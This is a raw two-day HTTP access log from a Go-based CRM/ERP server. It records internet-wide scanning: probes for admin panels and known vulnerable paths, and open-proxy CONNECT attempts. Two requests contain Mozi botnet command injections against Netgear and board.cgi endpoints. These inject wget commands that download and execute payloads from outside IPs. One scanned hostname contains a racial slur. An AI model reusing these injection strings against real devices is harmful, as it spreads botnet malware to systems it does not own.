INFO: 2025/03/17 01:18:57 main.go:22: Iniciando aplicação CRM/ERP...
INFO: 2025/03/17 01:18:57 main.go:41: Conexão com banco de dados estabelecida
2025/03/17 03:12:04 "GET http://gustavopantaleao.com.br:8080/favicon.ico HTTP/1.1" from 123.160.223.75:61777 - 404 19B in 53.095µs
2025/03/17 03:24:46 "GET http://pantaleaocontabil.com.br.gustavopantaleao.com.br:8080/ HTTP/1.1" from 194.88.99.95:61850 - 200 54B in 7.926µs
2025/03/17 04:32:11 "GET http:///manager/html HTTP/1.1" from 156.229.233.195:44404 - 404 19B in 46.984µs
2025/03/17 04:32:15 "GET http://15.204.211.81:8080/ HTTP/1.1" from 104.245.241.72:37136 - 200 54B in 25.67µs
2025/03/17 04:32:15 "GET http://15.204.211.81:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 104.245.241.72:37136 - 404 19B in 24.517µs
2025/03/17 05:57:11 "GET http:///manager/html HTTP/1.1" from 156.229.233.196:46150 - 404 19B in 37.345µs
2025/03/17 07:13:19 "GET http://15.204.211.81:8080/ HTTP/1.1" from 64.62.197.94:2817 - 200 54B in 12.735µs
2025/03/17 07:13:44 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 64.62.197.103:35889 - 404 19B in 55.801µs
2025/03/17 07:13:52 "GET http://api.ipify.orghttp://api.ipify.org/?format=json HTTP/1.1" from 64.62.197.99:8237 - 200 54B in 8.957µs
2025/03/17 07:13:56 "CONNECT http://www.shadowserver.org:443www.shadowserver.org:443 HTTP/1.1" from 64.62.197.100:31563 - 405 0B in 26.664µs
2025/03/17 07:14:00 "GET http://15.204.211.81:8080/geoserver/web/ HTTP/1.1" from 64.62.197.106:47395 - 404 19B in 49.518µs
2025/03/17 07:37:27 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:52570 - 405 0B in 33.036µs
2025/03/17 07:52:38 "GET http://15.204.211.81:8080/ HTTP/1.1" from 195.178.110.54:54978 - 200 54B in 12.654µs
2025/03/17 08:58:18 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:53192 - 405 0B in 23.106µs
2025/03/17 09:29:31 "GET http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.3.136.138:41897/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" from 61.3.136.138:54185 - 404 19B in 28.878µs
2025/03/17 10:39:10 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:58798 - 405 0B in 45.41µs
2025/03/17 12:49:07 "GET http://15.204.211.81:8080/manager/text/list HTTP/1.1" from 4.246.231.246:53046 - 404 19B in 49.399µs
2025/03/17 14:10:10 "GET http://15.204.211.81:8080/ HTTP/1.1" from 162.243.164.121:44282 - 200 54B in 7.224µs
2025/03/17 14:10:10 "GET http://15.204.211.81:8080/download/powershell/ HTTP/1.1" from 162.243.164.121:44296 - 404 19B in 60.36µs
2025/03/17 14:10:11 "GET http://15.204.211.81:8080/get.php HTTP/1.1" from 162.243.164.121:44308 - 404 19B in 40.521µs
2025/03/17 14:36:06 "GET http://15.204.211.81:8080/ HTTP/1.1" from 104.245.241.73:42674 - 200 54B in 9.289µs
2025/03/17 14:59:58 "GET http:///board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://45.164.177.40:11362/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" from 45.164.177.40:43074 - 404 19B in 30.662µs
2025/03/17 15:23:50 "GET http://15.204.211.81:8080/ HTTP/1.1" from 179.43.175.250:53582 - 200 54B in 9.65µs
2025/03/17 15:56:50 "GET http://15.204.211.81:8080/ HTTP/1.0" from 59.1.229.185:50908 - 200 54B in 10.531µs
2025/03/17 16:00:41 "GET http:///manager/html HTTP/1.1" from 156.229.233.196:46026 - 404 19B in 32.595µs
2025/03/17 16:10:20 "GET http://15.204.211.81:8080/Management.asp HTTP/1.1" from 141.98.11.97:43986 - 404 19B in 53.688µs
2025/03/17 16:11:52 "GET http:/// HTTP/1.0" from 78.108.177.50:37974 - 200 54B in 10.441µs
2025/03/17 16:21:32 "GET http:///manager/html HTTP/1.1" from 156.229.233.195:33800 - 404 19B in 32.505µs
2025/03/17 16:36:20 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:36238 - 405 0B in 29.699µs
2025/03/17 16:44:01 "GET http://cpcontacts.pantaleaoadvocacia.com.br/ HTTP/1.1" from 198.235.24.78:65428 - 200 54B in 88.557µs
2025/03/17 16:45:04 "GET http://webdisk.pantaleaoadvocacia.com.br/ HTTP/1.1" from 147.185.132.51:65080 - 200 54B in 11.513µs
2025/03/17 17:13:40 "GET http://15.204.211.81:8080/securityRealm/user/admin/search/index?q=a HTTP/1.1" from 92.255.57.58:39986 - 404 19B in 23.866µs
2025/03/17 17:15:48 "GET http://15.204.211.81:8080/ HTTP/1.1" from 92.255.57.58:37322 - 200 54B in 10.962µs
2025/03/17 17:18:57 "POST http://15.204.211.81:8080/Autodiscover/Autodiscover.xml HTTP/1.1" from 92.255.57.58:39490 - 404 19B in 1.071739ms
2025/03/17 17:23:14 "POST http://15.204.211.81:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" from 92.255.57.58:60714 - 404 19B in 42.193µs
2025/03/17 17:24:00 "GET http://15.204.211.81:8080/ HTTP/1.1" from 71.6.232.20:46758 - 200 54B in 10.19µs
2025/03/17 17:27:00 "GET http://15.204.211.81:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" from 92.255.57.58:35344 - 404 19B in 29.227µs
2025/03/17 17:31:51 "GET http://15.204.211.81:8080/?XDEBUG_SESSION_START=phpstorm HTTP/1.1" from 92.255.57.58:60294 - 200 54B in 11.042µs
2025/03/17 17:36:14 "GET http://15.204.211.81:8080/console/ HTTP/1.1" from 92.255.57.58:41910 - 404 19B in 32.965µs
2025/03/17 17:41:03 "GET http://15.204.211.81:8080/_ignition/execute-solution HTTP/1.1" from 92.255.57.58:34202 - 404 19B in 38.598µs
2025/03/17 17:42:49 "GET http://15.204.211.81:8080/ HTTP/1.1" from 92.255.57.58:47046 - 200 54B in 18.817µs
2025/03/17 17:47:33 "GET http://15.204.211.81:8080/ HTTP/1.1" from 92.255.57.58:35784 - 200 54B in 7.576µs
2025/03/17 17:53:09 "GET http://15.204.211.81:8080/actuator/gateway/routes HTTP/1.1" from 92.255.57.58:55196 - 404 19B in 31.634µs
2025/03/17 17:54:20 "GET http://15.204.211.81:8080/geoserver HTTP/1.1" from 92.255.57.58:51104 - 404 19B in 30.09µs
2025/03/17 18:09:14 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:52694 - 405 0B in 32.655µs
2025/03/17 19:07:34 "GET http://15.204.211.81:8080/ HTTP/1.1" from 167.249.37.104:45052 - 200 54B in 10.992µs
2025/03/17 19:07:35 "GET http://15.204.211.81:8080/ HTTP/1.1" from 167.249.37.104:45054 - 200 54B in 22.896µs
2025/03/17 19:07:35 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 167.249.37.104:45062 - 404 19B in 48.948µs
2025/03/17 19:07:35 "GET http://15.204.211.81:8080/favicon.png HTTP/1.1" from 167.249.37.104:45074 - 404 19B in 42.886µs
2025/03/17 19:07:35 "GET http://15.204.211.81:8080/icon.png HTTP/1.1" from 167.249.37.104:45080 - 404 19B in 51.092µs
2025/03/17 19:07:35 "GET http://15.204.211.81:8080//admin/img/favicons/favicon.ico HTTP/1.1" from 167.249.37.104:45094 - 404 19B in 38.909µs
2025/03/17 19:31:33 "GET http://pantaleaoadvocacia.com.br/ HTTP/1.1" from 205.210.31.162:61910 - 200 54B in 11.012µs
2025/03/17 19:46:52 "GET http://15.204.211.81:8080/aaa9 HTTP/1.1" from 164.92.117.229:36476 - 404 19B in 57.935µs
2025/03/17 19:47:16 "GET http://15.204.211.81:8080/aab8 HTTP/1.1" from 164.92.117.229:42976 - 404 19B in 37.024µs
2025/03/17 19:47:47 "GET http://15.204.211.81:8080/ HTTP/1.1" from 164.92.117.229:50264 - 200 54B in 9.889µs
2025/03/17 21:13:57 "GET http://vps-6189c3a7.vps.ovh.us/ HTTP/1.1" from 205.210.31.39:58468 - 200 54B in 18.267µs
2025/03/17 21:22:10 "GET http://15.204.211.81:8080/ HTTP/1.0" from 69.110.172.17:63571 - 200 54B in 8.085µs
2025/03/17 22:00:04 "GET http://15.204.211.81:8080/ HTTP/1.1" from 179.43.175.250:39134 - 200 54B in 16.312µs
2025/03/17 22:15:56 "GET http://cpanel.pantaleaoadvocacia.com.br/ HTTP/1.1" from 147.185.132.117:58990 - 200 54B in 9.117µs
2025/03/17 22:50:36 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:47348 - 405 0B in 29.308µs
2025/03/17 23:31:38 "GET http:/// HTTP/1.0" from 198.235.24.178:51121 - 200 54B in 9.728µs
2025/03/17 23:58:35 "GET http://pantaleaoadvocacia.com.br.gustavopantaleao.com.br/ HTTP/1.1" from 205.210.31.12:65104 - 200 54B in 24.449µs
2025/03/18 00:12:19 "GET http://15.204.211.81:8080/ HTTP/1.1" from 20.221.68.98:59164 - 200 54B in 14.009µs
2025/03/18 00:18:54 "GET http:///manager/html HTTP/1.1" from 156.229.233.195:44170 - 404 19B in 33.566µs
2025/03/18 00:26:18 "CONNECT http://google.com:443google.com:443 HTTP/1.1" from 87.120.187.180:50540 - 405 0B in 83.737µs
2025/03/18 00:29:03 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:60766 - 405 0B in 21.893µs
2025/03/18 00:45:39 "GET http:///manager/html HTTP/1.1" from 156.229.233.196:38298 - 404 19B in 26.613µs
2025/03/18 00:51:15 "GET http:/// HTTP/1.0" from 104.234.115.62:21229 - 200 54B in 9.79µs
2025/03/18 00:51:40 "GET http://15.204.211.81:8080/ HTTP/1.1" from 104.234.115.62:46158 - 200 54B in 29.8µs
2025/03/18 00:52:49 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 104.234.115.62:49738 - 404 19B in 27.075µs
2025/03/18 01:38:25 "GET http://15.204.211.81:8080/ HTTP/1.1" from 178.62.216.207:46412 - 200 54B in 9.528µs
2025/03/18 01:41:35 "GET http:/// HTTP/1.0" from 1.204.166.3:51904 - 200 54B in 11.113µs
2025/03/18 01:41:35 "OPTIONS http:/// HTTP/1.0" from 1.204.166.3:52254 - 405 0B in 1.691827ms
2025/03/18 01:41:37 "GET http:///bad%20ip%2C/Tr%69nity.php%2ebakup HTTP/1.0" from 1.204.166.3:52334 - 404 19B in 49.258µs
2025/03/18 01:42:03 "HEAD http://15.204.211.81:8080/ HTTP/1.1" from 1.204.166.3:54724 - 405 0B in 28.486µs
2025/03/18 01:47:22 "GET http://www.principepaz.com.br/ HTTP/1.1" from 198.235.24.222:64646 - 200 54B in 11.331µs
2025/03/18 01:48:10 "GET http://15.204.211.81:8080/ HTTP/1.1" from 104.245.241.73:56970 - 200 54B in 10.031µs
2025/03/18 01:49:00 "GET http://15.204.211.81:8080/hudson HTTP/1.1" from 20.65.194.176:51358 - 404 19B in 29.42µs
2025/03/18 01:53:21 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:50764 - 405 0B in 32.244µs
2025/03/18 02:21:47 "GET http://15.204.211.81:8080/ HTTP/1.1" from 167.94.146.52:49248 - 200 54B in 533.063µs
2025/03/18 02:21:57 "GET http://15.204.211.81:8080/ HTTP/1.1" from 167.94.146.52:37280 - 200 54B in 26.153µs
2025/03/18 02:21:57 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 167.94.146.52:37294 - 404 19B in 276.001µs
2025/03/18 02:21:57 "PRI http://* HTTP/2.0" from 167.94.146.52:37306 - 405 0B in 155.099µs
2025/03/18 02:22:01 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 167.94.146.52:47946 - 404 19B in 251.713µs
2025/03/18 03:30:25 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:33590 - 405 0B in 756.128µs
2025/03/18 03:33:24 "GET http://15.204.211.81:8080/ HTTP/1.1" from 64.62.197.14:43691 - 200 54B in 180.551µs
2025/03/18 03:33:59 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 64.62.197.9:22987 - 404 19B in 32.655µs
2025/03/18 03:34:18 "GET http://api.ipify.orghttp://api.ipify.org/?format=json HTTP/1.1" from 64.62.197.6:18699 - 200 54B in 7.234µs
2025/03/18 03:34:30 "CONNECT http://www.shadowserver.org:443www.shadowserver.org:443 HTTP/1.1" from 64.62.197.4:50615 - 405 0B in 645.257µs
2025/03/18 03:34:44 "GET http://15.204.211.81:8080/geoserver/web/ HTTP/1.1" from 64.62.197.13:41627 - 404 19B in 29.139µs
2025/03/18 04:00:26 "GET http://proxy.killnigga.com/ HTTP/1.1" from 147.185.132.162:60468 - 200 54B in 9.42µs
2025/03/18 04:08:14 "GET http://gustavopantaleao.com.br/ HTTP/1.1" from 205.210.31.72:58284 - 200 54B in 10.18µs
2025/03/18 04:52:00 "GET http://15.204.211.81:8080/ HTTP/1.1" from 198.235.24.74:63364 - 200 54B in 630.298µs
2025/03/18 05:13:10 "GET http://ns1.gustavopantaleao.com.br/ HTTP/1.1" from 198.235.24.178:64846 - 200 54B in 9.118µs
2025/03/18 06:13:12 "GET http://unionchurch.com.br/ HTTP/1.1" from 205.210.31.226:60722 - 200 54B in 10.722µs
2025/03/18 08:10:44 "GET http://www.cloud.gustavopantaleao.com.br/ HTTP/1.1" from 205.210.31.86:60508 - 200 54B in 14.84µs
2025/03/18 08:14:40 "GET http:///manager/html HTTP/1.1" from 156.229.233.196:39192 - 404 19B in 970.638µs
2025/03/18 08:23:20 "GET http://15.204.211.81:8080/ HTTP/1.0" from 59.187.215.6:60955 - 200 54B in 10.732µs
2025/03/18 08:28:35 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:52556 - 405 0B in 29.379µs
2025/03/18 08:32:27 "GET http://15.204.211.81:8080/ HTTP/1.1" from 104.245.241.73:47398 - 200 54B in 8.006µs
2025/03/18 08:34:57 "GET http://cloud.gustavopantaleao.com.br/ HTTP/1.1" from 198.235.24.73:65180 - 200 54B in 17.966µs
2025/03/18 08:45:14 "GET http://15.204.211.81:8080/ HTTP/1.0" from 61.102.66.112:61878 - 200 54B in 269.549µs
2025/03/18 08:47:58 "GET http:/// HTTP/1.0" from 78.108.177.52:37974 - 200 54B in 11.703µs
2025/03/18 09:17:35 "GET http://15.204.211.81/ HTTP/1.1" from 167.99.194.33:58866 - 200 54B in 8.275µs
2025/03/18 09:17:35 "GET http://15.204.211.81/favicon.ico HTTP/1.1" from 167.99.194.33:58868 - 404 19B in 211.772µs
2025/03/18 09:41:54 "GET http://mail.pantaleaoadvocacia.com.br/ HTTP/1.1" from 205.210.31.184:65046 - 200 54B in 53.948µs
2025/03/18 09:53:12 "GET http://15.204.211.81:8080/ HTTP/1.1" from 128.199.22.226:40752 - 200 54B in 10.661µs
2025/03/18 09:53:13 "GET http://15.204.211.81:8080/download/powershell/ HTTP/1.1" from 128.199.22.226:42466 - 404 19B in 25.17µs
2025/03/18 09:53:13 "GET http://15.204.211.81:8080/get.php HTTP/1.1" from 128.199.22.226:42478 - 404 19B in 40.54µs
2025/03/18 10:12:15 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:46534 - 405 0B in 559.788µs
2025/03/18 10:15:54 "CONNECT http://ifconfig.co:443ifconfig.co:443 HTTP/1.1" from 87.121.84.132:45294 - 405 0B in 1.824711ms
2025/03/18 11:07:25 "GET http://www.pantaleaoadvocacia.com.br/ HTTP/1.1" from 198.235.24.116:58416 - 200 54B in 8.306µs
2025/03/18 11:13:42 "GET http://15.204.211.81/ HTTP/1.0" from 47.237.12.161:56506 - 200 54B in 13.508µs
2025/03/18 11:13:42 "GET http://15.204.211.81:8080/ HTTP/1.1" from 47.237.12.161:56514 - 200 54B in 8.326µs
2025/03/18 11:13:43 "GET http://15.204.211.81:8080/favicon.ico HTTP/1.1" from 47.237.12.161:56526 - 404 19B in 33.286µs
2025/03/18 11:51:41 "GET http://www.google.comhttp://www.google.com/ HTTP/1.0" from 45.151.237.100:42384 - 200 54B in 11.804µs
2025/03/18 11:57:43 "GET http://15.204.211.81:8080/ HTTP/1.1" from 185.247.137.226:50129 - 200 54B in 10.831µs
2025/03/18 12:01:51 "POST http://15.204.211.81:8080/FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" from 45.95.169.130:51094 - 404 19B in 57.695µs
2025/03/18 12:50:00 "GET http://15.204.211.81:8080/ HTTP/1.0" from 106.155.226.253:61601 - 200 54B in 13.206µs
2025/03/18 13:11:48 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:50538 - 405 0B in 699.647µs
2025/03/18 13:36:13 "GET http://15.204.211.81:8080/ HTTP/1.0" from 121.148.200.133:55120 - 200 54B in 10.561µs
2025/03/18 14:06:29 "GET http://15.204.211.81:8080/ HTTP/1.0" from 163.131.106.215:61629 - 200 54B in 18.397µs
2025/03/18 14:48:55 "GET http://15.204.211.81:8080/ HTTP/1.0" from 67.80.239.203:60578 - 200 54B in 13.167µs
2025/03/18 14:51:16 "GET http://15.204.211.81:8080/ HTTP/1.1" from 195.178.110.54:38834 - 200 54B in 232.393µs
2025/03/18 15:21:25 "GET http://principepaz.com.br/ HTTP/1.1" from 147.185.132.94:62226 - 200 54B in 9.53µs
2025/03/18 15:48:48 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 37.44.238.88:45472 - 405 0B in 1.963418ms
2025/03/18 16:14:45 "GET http://15.204.211.81:8080/ HTTP/1.1" from 45.156.130.47:56275 - 200 54B in 219.959µs
2025/03/18 17:39:57 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:42428 - 405 0B in 427.223µs
2025/03/18 18:35:00 "GET http://15.204.211.81:8080/ HTTP/1.1" from 195.178.110.54:39628 - 200 54B in 9.258µs
2025/03/18 18:36:20 "GET http://15.204.211.81:8080/?XDEBUG_SESSION_START=phpstorm HTTP/1.1" from 92.255.57.58:50004 - 200 54B in 12.525µs
2025/03/18 18:54:06 "GET http://15.204.211.81:8080/actuator/gateway/routes HTTP/1.1" from 92.255.57.58:42498 - 404 19B in 1.245667ms
2025/03/18 19:19:30 "CONNECT http://api.ip.pn:443api.ip.pn:443 HTTP/1.1" from 185.91.127.81:47734 - 405 0B in 303.376µs
2025/03/18 19:30:58 "CONNECT http://fingerprints.bablosoft.com:443fingerprints.bablosoft.com:443 HTTP/1.1" from 90.151.171.108:18963 - 405 0B in 315.269µs
2025/03/18 19:31:09 "GET http://fingerprints.bablosoft.comhttp://fingerprints.bablosoft.com/ip?Z71861805620Q1 HTTP/1.1" from 90.151.171.108:3851 - 404 19B in 31.373µs
